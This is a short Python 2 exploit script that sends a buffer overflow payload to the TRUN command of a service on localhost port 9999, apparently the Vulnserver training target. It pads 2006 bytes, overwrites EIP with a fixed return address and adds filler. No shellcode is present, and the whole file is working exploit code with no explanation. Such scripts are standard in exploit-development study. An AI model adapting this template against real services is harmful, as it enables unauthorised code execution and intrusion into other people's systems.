import socket
import struct
import os
import sys

trun = "TRUN ."
offset = 2006
eip = struct.pack("<I", 0x62501205)

payload = ""
payload += trun
payload += "A" * offset
payload += eip
payload += "C" * (4099 - offset - len(eip))

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)     # encode('utf-8') has been removed since it couldn't decode \x80
s.close()    
